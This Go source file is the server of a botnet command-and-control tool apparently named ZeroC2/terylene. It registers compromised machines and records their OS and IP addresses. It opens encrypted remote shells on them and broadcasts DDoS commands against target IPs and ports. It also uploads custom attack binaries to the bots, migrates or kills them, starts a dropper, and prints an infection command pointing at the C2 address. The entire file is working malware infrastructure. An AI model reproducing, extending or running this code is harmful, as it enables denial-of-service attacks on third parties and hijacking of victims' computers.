package main

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	config "terylene/config"
	zcrypto "terylene/crypto"
	dropper "terylene/server/components/dropper"
	"terylene/server/components/fade"
	"terylene/server/components/setup"
	"terylene/server/components/transfer"
	poly "terylene/server/theme/default"
	"time"

	tablewriter "github.com/olekukonko/tablewriter"

	"github.com/fatih/color"
	zmq "github.com/pebbe/zmq4"
)

type Botstruc struct {
	conn       string
	arch       string
	OS         string
	localip    string
	pubip      string
	connID     string
	reversekey string
}

type Method struct {
	name          string
	description   string
	path          string
	flag_entries  []methflag
	displayformat string
	rawformat     string
}

type methflag struct {
	entry     string
	entrytype string
}

type ParseType struct {
	VarType string
}

const (
	chunkSize = 1024 // Define the size of each file chunk
	//you can change this value for faster method upload speed
)

func isValidType(t string) bool {
	validTypes := map[string]bool{
		"string": true,
		"ip":     true,
		"port":   true,
		"int":    true,
		"uint":   true,
	}

	return validTypes[t]
}

var (
	//DONT change any of these
	Allmethods     = poly.AllMethods
	connIDs        = make(map[string]string)
	tera           = make(map[string]Botstruc)
	aliveclient    = make(map[string]time.Time)
	custom_methods = make([]Method, 0)
	shell          = false
	start          = time.Now()
	pubmutex       sync.Mutex
	routmutex      sync.Mutex
	alivemutex     sync.RWMutex
)

func broadcaster(message []string, publisher *zmq.Socket) {
	pubmutex.Lock()
	publisher.SendMessage(message)
	pubmutex.Unlock()
}

func heartroutsend(router *zmq.Socket) {
	for {
		for id := range connIDs {
			routmutex.Lock()
			router.SendMessage(id, "h")
			routmutex.Unlock()
		}
		time.Sleep(2 * time.Second)
	}
}

func heartpubsend(publisher *zmq.Socket) {
	for {
		broadcaster([]string{"terylene", "h"}, publisher)
		time.Sleep(2 * time.Second)
	}
}

func heartbeatcheck() {
	for {
		alivemutex.RLock()
		for id, last := range aliveclient {
			if time.Since(last) > 5*time.Second {
				delete(aliveclient, id)
				delete(tera, id)
				delete(connIDs, id)
				fmt.Printf("\n\033[1;33mheartbeat monitor: terylene %s has been pronounced dead\033[0m", id)
			}
		}
		alivemutex.RUnlock()
		time.Sleep(3 * time.Second)
	}
}

func ExistsInMap(m map[string]string, targetValue string) bool {
	for _, value := range m {
		if value == targetValue {
			return true
		}
	}
	return false
}

func clearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func isPublicIPv4(address string) bool {
	ip := net.ParseIP(address)
	if ip == nil || ip.To4() == nil {
		return false
	}

	return !ip.IsLoopback() && !ip.IsLinkLocalMulticast() && !ip.IsLinkLocalUnicast() && !ip.IsMulticast() && !ip.IsUnspecified() && !ip.IsPrivate()
}

func isValidport(port int) bool {
	return port >= 0 && port <= 65535
}

func routerhandle(router *zmq.Socket) {
	for {
		msg, err := router.RecvMessage(0)

		go func(msg []string) {
			if err != nil {
				return
			}
			if len(msg) == 0 || len(msg) == 1 {
				return
			}

			//registration
			if len(msg) == 7 {
				if msg[1] == "reg" {
					if ExistsInMap(connIDs, msg[6]) {
						routmutex.Lock()
						router.SendMessage(msg[0], "kys")
						routmutex.Unlock()
					} else {
						key, err := zcrypto.GenerateRandomKey(32)
						if err != nil {
							log.Fatalln("Key generation failed")
						}
						bot := Botstruc{
							conn:       msg[0],
							arch:       msg[2],
							OS:         msg[3],
							localip:    msg[4],
							pubip:      msg[5],
							connID:     msg[6],
							reversekey: string(key),
						}
						tera[msg[0]] = bot
						connIDs[msg[0]] = msg[6]
						enckey, err := zcrypto.EncryptAES256(key, []byte(config.AESkey))
						if err != nil {
							log.Fatalln(err)
						}
						routmutex.Lock()
						router.SendMessage(msg[0], "terylene", config.Broadcastport, enckey)
						routmutex.Unlock()
					}
				}
			}

			if len(msg) == 2 {
				if msg[1] == "h" {
					alivemutex.Lock()
					aliveclient[msg[0]] = time.Now()
					alivemutex.Unlock()
				} else if msg[1] == "injustice" {
					routmutex.Lock()
					router.SendMessage(msg[0], "justice")
					routmutex.Unlock()
				} else if msg[1] == "isdone" {
					routmutex.Lock()
					router.SendMessage(msg[0], "isserved")
					routmutex.Unlock()
				}
			}
			if len(msg) == 3 {
				if shell {
					var polykey string
					for _, key := range tera {
						if msg[0] == key.conn {
							polykey = key.reversekey
						}
					}
					decoutput, err := zcrypto.DecryptChaCha20Poly1305([]byte(msg[2]), []byte(polykey))
					if err != nil {
						log.Println(err)
						return
					}
					if msg[1] == "cmdS" {
						fmt.Printf("\033[32m%s\033[0m\n", strings.Trim(string(decoutput), "\n"))
					} else {
						fmt.Printf("\x1b[31m%s\x1b[0m\n", strings.Trim(string(decoutput), "\n"))
					}
				}
			}
		}(msg)
	}
}

func IPC() {
	rep, err := zmq.NewSocket(zmq.REP)

	if err != nil {
		log.Fatalln(err)
	}

	rep.Bind("ipc:///tmp/ZeroCall")

	for {
		msg, err := rep.RecvMessage(0)

		if err != nil {
			log.Println(err)
			break
		}

		switch len(msg) {
		case 1:
			if msg[0] == "GetBotsOnline" {
				rep.SendMessage(fmt.Sprintf("%d", len(aliveclient)))
			} else if msg[0] == "GetBotslist" {
				var result []string
				for _, bot := range tera {
					result = append(result, bot.connID)
				}
				rep.SendMessage(result)
			} else if msg[0] == "Uptime" {
				uptime := time.Since(start)
				rep.SendMessage(fmt.Sprintf("%v", uptime))
			} else if msg[0] == "shutdown" {
				rep.SendMessage("success")
				os.Exit(125)
			} else if msg[0] == "Getpayload" {
				if config.C2ip == "0.0.0.0" {
					newC2ip := getpubIp()
					rep.SendMessage(fmt.Sprintf(config.Infcommand, newC2ip))
					continue
				}
				rep.SendMessage(fmt.Sprintf(config.Infcommand, config.C2ip))
			}
		case 2:
			if msg[0] == "GetInfo" {
				found := false
				for _, bot := range tera {
					if bot.connID == msg[1] {
						found = true
						rep.SendMessage(bot.arch, bot.localip, bot.pubip, bot.OS, bot.reversekey)
					}
				}
				if !found {
					rep.SendMessage("not found")
				}
			}
		default:
			rep.SendMessage("error")
		}
	}

	log.Println("ZeroC2 IPC Call has shutdown")
}

func randomtransfer(target string, rport, amount int, router, publisher *zmq.Socket) {
	count := 0
	for id := range aliveclient {
		routmutex.Lock()
		router.SendMessage(id, "migrate", target, rport)
		routmutex.Unlock()
		broadcaster([]string{connIDs[id], "migrate"}, publisher)
		delete(aliveclient, id)
		delete(tera, id)
		delete(connIDs, id)
		if count == amount {
			break
		}
	}

}

func killprompt(prompt string, router, publisher *zmq.Socket) string {
	parts := strings.Fields(prompt)

	if len(parts) != 2 {
		return poly.Killhelp
	}

	if parts[1] == "all" {
		killall(publisher)
	} else {
		return (kill(parts[1], router))
	}

	return ""
}

func killall(publisher *zmq.Socket) {
	broadcaster([]string{"terylene", "killall"}, publisher)
	clearScreen()
	fmt.Println(poly.Killallsuc)
}

func kill(connId string, router *zmq.Socket) string {
	for zid, id := range connIDs {
		if id == connId {
			routmutex.Lock()
			router.SendMessage(zid, "kill")
			routmutex.Unlock()
			return fmt.Sprintf(poly.Killone, connId)
		}
	}

	return poly.NoConnId
}

func transferprompt(prompt string, router, publisher *zmq.Socket) string {
	parts := strings.Fields(prompt)

	if len(parts) != 5 {
		return poly.Transferhelp
	}

	if len(aliveclient) == 0 {
		return poly.Nobots
	}

	target := parts[1]
	port := parts[2]

	if !isPublicIPv4(target) {
		return poly.InvalidIp
	}

	rport, err := strconv.Atoi(port)

	if err != nil {
		return poly.Invalidport
	}

	if !isValidport(rport) {
		return poly.Invalidport
	}

	err = transfer.Transfercheck(target, port)

	if err != nil {
		return poly.NoMitigation
	}

	if parts[3] == "random" {
		number, err := strconv.Atoi(parts[4])

		if err != nil {
			return poly.InvalidNumber
		}

		randomtransfer(target, rport, number, router, publisher)
		return poly.MitSuccess
	}

	if parts[3] == "specific" {
		for zid, id := range connIDs {
			if id == parts[4] {
				routmutex.Lock()
				router.SendMessage(zid, "migrate", target, rport)
				routmutex.Unlock()
				broadcaster([]string{id, "migrate"}, publisher)
				delete(aliveclient, zid)
				delete(tera, zid)
				delete(connIDs, zid)
				return poly.MitSuccess
			} else {
				continue
			}
		}

		return poly.NoConnId
	}

	return ""
}

func getpubIp() string {
	url := "https://api.ipify.org?format=text"
	resp, err := http.Get(url)
	if err != nil {
		return "<your ip>"
	}
	defer resp.Body.Close()
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "<your ip>"
	}
	return string(ip)
}

func reversehandler(connID string, scanner *bufio.Scanner, router *zmq.Socket) {
	clearScreen()
	var polykey string
	var conn string
	shell = true
	for _, value := range tera {
		if value.connID == connID {
			polykey = value.reversekey
			conn = value.conn
		}
	}

	if polykey == "" {
		fmt.Print(fade.Amber(poly.Shellart3))
		fmt.Printf("\nNo such terylene connID: %s\n", connID)
		return
	} else {
		fmt.Print(fade.Water(poly.Shellart))
	}
	for {
		scanner.Scan()
		err := scanner.Err()
		if err != nil {
			log.Fatalln(err)
		}
		command := scanner.Text()

		if command == "" {
			continue
		}

		if command == "clear" {
			clearScreen()
		}

		if command == "exit" || command == "background" {
			clearScreen()
			shell = false
			fmt.Print(fade.Water(poly.Shellart2))
			break
		}
		encommand, err := zcrypto.EncryptChaCha20Poly1305([]byte(command), []byte(polykey))
		if err != nil {
			log.Fatalln(err)
		}
		routmutex.Lock()
		router.SendMessage(conn, "cmd", string(encommand))
		routmutex.Unlock()
	}
}

func uploadmethod(meth Method, pub *zmq.Socket) {
	filePath := meth.path

	file, err := os.Open(filePath)
	if err != nil {
		log.Println(err)
		return
	}

	name := meth.name
	fileInfo, err := os.Stat(filePath)
	usageformat := []string{fmt.Sprintf("!%s", meth.name)}

	for _, flagEntry := range meth.flag_entries {
		usageformat = append(usageformat, "<"+flagEntry.entry+">")
	}

	if err != nil {
		log.Println(err)
		return
	}

	filename := fileInfo.Name()
	if err != nil {
		log.Printf("could not open file: %v\n", err)
		return
	}

	defer file.Close()

	reader := bufio.NewReader(file)
	buffer := make([]byte, chunkSize)

	pubmutex.Lock()
	pub.SendMessage("terylene", "file_start", name, filename)
	pubmutex.Unlock()

	fmt.Println("uploading...")

	for {
		bytesRead, err := reader.Read(buffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Fatalf("could not read chunk from file: %v", err)
		}
		chunk := buffer[:bytesRead]

		encodedchunk := base64.StdEncoding.EncodeToString(chunk)

		pubmutex.Lock()
		pub.SendMessage("terylene", "file_chunk", name, encodedchunk)
		pubmutex.Unlock()
	}

	pubmutex.Lock()
	pub.SendMessage("terylene", "file_end", meth.name, meth.rawformat)
	pubmutex.Unlock()

	meth.displayformat = strings.Join(usageformat, " ")

	custom_methods = append(custom_methods, meth)
	fmt.Println("upload finished")

	Allmethods = append(Allmethods, []string{meth.name, meth.description, strings.Join(usageformat, " ")})
}

func addmethod(method string, publisher *zmq.Socket) {

	clearScreen()

	fmt.Println(fade.Water(poly.AddmethodArt))

	scanner := bufio.NewScanner(os.Stdin)

	var meth Method

	for _, value := range Allmethods {
		if value[0] == method {
			color.Red("conflicting method name with builtin name: %s\n", value[0])
			return
		}
	}

	meth.name = method

	for {
		fmt.Print("method path:")
		scanner.Scan()
		mpath := scanner.Text()
		mpath = strings.TrimSpace(mpath)

		if mpath == "exit" {
			clearScreen()
			return
		}

		fileInfo, err := os.Stat(mpath)

		if err == nil {
			if fileInfo.IsDir() {
				color.Red("Path is a directory")
				continue
			}
			meth.path = mpath
			break
		} else if os.IsNotExist(err) {
			color.Red("No such file present")
			continue
		} else {
			log.Printf("fatal error: %s\n", err)
			continue
		}
	}

	fmt.Print("description:")
	scanner.Scan()
	description := scanner.Text()
	description = strings.TrimSpace(description)

	if description == "exit" {
		return
	}

	meth.description = description

	color.Green("input the format to execute this method (example: ./$main::string $target::ip $port::port $duration::int)")

	for {
		fmt.Print("format:")

		scanner.Scan()
		format := scanner.Text()
		format = strings.TrimSpace(format)

		if format == "exit" {
			return
		}

		var flags []methflag
		seen := make(map[string]bool)
		ifdup := false
		ifmain := false
		ifinvalid := false

		pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
		re := regexp.MustCompile(pattern)

		matches := re.FindAllStringSubmatch(format, -1)

		if len(matches) == 0 {
			color.Red("there are no entry!!!")
			continue
		}

		for _, match := range matches {

			if match[1] == "main" {
				ifmain = true
				continue
			}

			if seen[match[1]] {
				color.Red("duplication value detected:%s", match[1])
				ifdup = true
				break
			} else {
				seen[match[1]] = true
			}

			if !isValidType(match[2]) {
				color.Red("invalid type '%s' for %s entry", match[2], match[1])
				ifinvalid = true
				break
			}

			flags = append(flags, methflag{entry: match[1], entrytype: match[2]})
		}

		if ifdup || ifinvalid {
			continue
		}

		if !ifmain {
			color.Red("Format has no main argument")
			continue
		}

		meth.rawformat = format
		meth.flag_entries = flags

		break
	}

	color.Green("Name:%s\nMethod path:%s\nFormat:%s", meth.name, meth.path, meth.rawformat)
	fmt.Print("Are the information above correct? [Y/N]")

	scanner.Scan()
	result := scanner.Text()

	if strings.ToLower(result) == "y" {
		uploadmethod(meth, publisher)
	} else {
		fmt.Println("aborting operation...")
		return
	}
}

func valuecheck(value string, valuetype string) error {
	switch valuetype {
	case "string":
		return nil
	case "ip":
		out := net.ParseIP(value) != nil
		if out {
			return nil
		} else {
			return fmt.Errorf("%s is not an IP", value)
		}
	case "port":
		_, err := strconv.ParseUint(value, 10, 16)
		if err != nil {
			return fmt.Errorf("%s is not a valid port range", value)
		}

		return nil
	case "int":
		_, err := strconv.ParseInt(value, 10, 64)
		if err != nil {
			return fmt.Errorf("%s not a valid int64 value", value)
		}
		return nil
	case "uint":
		_, err := strconv.ParseUint(value, 10, 64)
		if err != nil {
			return fmt.Errorf("%s not a valid uint64 value", value)
		}
		return nil
	default:
		return fmt.Errorf("unknown value type: %s", valuetype)
	}
}

func deletemethod(methodName string, publisher *zmq.Socket) error {
	deleteMethodByName := func(slice []Method, name string) []Method {
		for i, method := range slice {
			if method.name == name {
				return append(slice[:i], slice[i+1:]...)
			}
		}
		return slice
	}

	deleteFromSlice := func(s [][]string, value string) [][]string {
		for i, row := range s {
			if len(row) > 0 && row[0] == value {
				return append(s[:i], s[i+1:]...)
			}
		}
		return s
	}

	found := false
	for _, method := range custom_methods {
		if method.name == methodName {
			found = true
			break
		}
	}

	if found {
		custom_methods = deleteMethodByName(custom_methods, methodName)
		Allmethods = deleteFromSlice(Allmethods, methodName)
		pubmutex.Lock()
		publisher.SendMessage("terylene", "deletemethod", methodName)
		pubmutex.Unlock()
	} else {
		fmt.Println("Custom Method", methodName, "not found", "(NOTE: you cant delete a builtin method or a method that doesnt exist)")
		return errors.New("method not found")
	}

	return nil

}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	terminalcolor, router, publisher := setup.Setup()

	defer router.Close()
	defer publisher.Close()

	go heartroutsend(router)
	go heartpubsend(publisher)
	go heartbeatcheck()

	go dropper.Dropstart()
	color.Green("[✔] successfully started zeroC2 dropper")
	go IPC()
	color.Green("[✔] successfully started zeroC2 IPC calls")

	fmt.Print("press enter to continue...")
	scanner.Scan()

	clearScreen()
	fmt.Print(poly.Welcome)
	go routerhandle(router)

	for {
		terminalcolor.Print(poly.Cmd)
		scanner.Scan()

		command := scanner.Text()
		command = strings.TrimSpace(command)
		if scanner.Err() != nil {
			fmt.Println("an error has occured", scanner.Err())
			break
		}

		parts := strings.Fields(command)

		if len(parts) >= 1 {
			switch parts[0] {
			case "transfer":
				fmt.Println(transferprompt(command, router, publisher))
				continue
			case "kill":
				fmt.Println(killprompt(command, router, publisher))
			case "shell":
				if len(parts) != 2 {
					fmt.Println(poly.Shellhelp)
					continue
				}

				reversehandler(parts[1], scanner, router)
			case "addmethod":
				if len(parts) != 2 {
					color.Red(poly.AddmethodHelp)
					continue
				}
				addmethod(parts[1], publisher)
			case "deletemethod":
				if len(parts) != 2 {
					color.Red(poly.DeletemethodHelp)
					continue
				}
				deletemethod(parts[1], publisher)
			case "help":
				fmt.Print(strings.TrimLeft(poly.Help, "\n"))
			case "clear":
				clearScreen()
			case "exit":
				publisher.Close()
				color.Red("[✔] successfully shutdown broadcast")
				router.Close()
				color.Red("[✔] successfully shutdown router")
				os.Exit(1)
			case "methods":
				table := tablewriter.NewWriter(os.Stdout)
				table.SetHeader([]string{"Methods", "descriptions", "formats"})

				table.SetHeaderColor(
					tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
					tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
					tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
				)

				for _, v := range Allmethods {
					table.Append(v)
				}
				table.Render() // Send output
			case "list":
				fmt.Println("Number of bots:", len(aliveclient))
				if len(aliveclient) != 0 {
					for _, bot := range tera {
						fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\nlocal ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip, bot.localip)
					}
				}
			case "payload":
				fmt.Println("terylene payload:")
				if config.C2ip == "0.0.0.0" {
					newC2ip := getpubIp()
					fmt.Println(fmt.Sprintf(config.Infcommand, newC2ip))
					continue
				}
				fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
			default:
				methodsendhandler(command, publisher)
			}
		}

	}
}

func methodsendhandler(command string, publisher *zmq.Socket) {
	parts := strings.Fields(command)
	if len(parts) > 0 {
		if strings.HasPrefix(parts[0], "!") {
			containsBlocked := false
			//check if the method is builtin
			for _, value := range config.Methods {
				if parts[0] == ("!" + value) {
					for _, block := range config.Blocked {
						if strings.Contains(command, block) {
							containsBlocked = true
						}
					}
					if containsBlocked {
						return
					}

					if len(parts) == 4 {
						query := []string{"terylene"}

						if !isPublicIPv4(parts[1]) {
							color.Red("%s is not a public ip", parts[1])
							continue
						}
						query = append(query, parts[1])

						_, err := strconv.Atoi(parts[2])
						if err != nil {
							color.Red("%s port is not integer", parts[2])
							continue
						}
						query = append(query, parts[2])

						_, err = strconv.Atoi(parts[3])
						if err != nil {
							color.Red("%s duration is not integer", parts[3])
							continue
						}

						query = append(query, parts[3])

						broadcaster(query, publisher)
						clearScreen()
						fmt.Println(poly.Ddosmsg)
						return
					} else {
						fmt.Println("!" + fmt.Sprintf("%s <target> <port> <duration>", value))
						return
					}
				}
			}

			for _, value := range custom_methods {
				if parts[0] == ("!" + value.name) {
					for _, block := range config.Blocked {
						if strings.Contains(command, block) {
							containsBlocked = true
						}
					}

					if containsBlocked {
						return
					}

					if (len(parts) - 1) != len(value.flag_entries) {
						fmt.Println(value.displayformat)
						return
					}
					query := []string{"terylene", value.name}

					for i, value := range value.flag_entries {
						err := valuecheck(parts[i+1], value.entrytype)

						if err != nil {
							color.Red(fmt.Sprintf("%v", err))
							return
						}
						query = append(query, parts[i+1])
					}

					broadcaster(query, publisher)

					fmt.Println(poly.Ddosmsg)
					break
				}
			}
		}
	}
}
